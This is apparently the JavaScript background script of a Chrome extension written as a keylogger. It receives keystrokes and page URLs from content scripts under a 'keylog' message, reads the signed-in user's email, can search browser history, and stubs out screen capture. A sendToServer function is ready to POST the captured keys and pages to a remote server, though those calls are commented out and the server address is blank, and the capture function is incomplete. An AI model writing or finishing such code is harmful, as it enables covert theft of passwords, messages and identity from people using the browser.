var rserverIP = ""
function sendToServer(data) {
    var req = new XMLHttpRequest();
    req.open("POST", rserverIP, true);
    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req.send(data);
    req.onload = function(){
        console.log(this.responseText);
    };
}

function getHistory(number){
    chrome.history.search({text: '', maxResults: number}, function(data) {
        data.forEach(function(page) {
            console.log(page.url);
        });
    });
}


var lastURL = "";
var userEmail = ""
chrome.identity.getProfileUserInfo((userinfo) => {userEmail = userinfo.email});

function handleMessage(request){
    if (request.type === "keylog"){
        if (lastURL !== request.page){
            console.log(userEmail);
            console.log(request.page);
            //sendToServer("page="+request.page);
            lastURL = request.page;
        }
        console.log(request.key);
        //sendToServer("key="+request.key);
    }
}

chrome.runtime.onMessage.addListener(handleMessage);


function makeCapture(){
    chrome.desktopCapture.chooseDesktopMedia([
        "screen",
        "window",
        "tab"
    ], tab, (streamId) => {
        //check whether the user canceled the request or not
        if (streamId && streamId.length) {
            
        }
    })
}



